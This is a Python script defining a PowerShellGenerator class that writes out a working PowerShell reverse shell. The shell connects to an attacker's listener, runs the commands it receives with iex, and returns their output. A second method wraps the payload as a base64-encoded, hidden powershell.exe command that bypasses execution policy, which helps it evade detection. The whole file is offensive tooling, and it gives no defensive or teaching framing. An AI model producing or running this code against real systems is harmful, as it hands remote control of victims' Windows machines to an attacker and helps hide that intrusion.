#!/usr/bin/env python3
import base64

class PowerShellGenerator:
    def __init__(self, lhost, lport):
        self.lhost = lhost
        self.lport = lport
    
    def generate_reverse_shell(self):
        """Generate PowerShell reverse shell"""
        ps_code = f'''
$client = New-Object System.Net.Sockets.TCPClient("{self.lhost}",{self.lport});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{{0}};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
}};
$client.Close()
'''
        return ps_code.strip()
    
    def generate_encoded_command(self, code):
        """Create base64 encoded PowerShell command"""
        encoded = base64.b64encode(code.encode('utf-16le')).decode()
        return f"powershell.exe -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand {encoded}"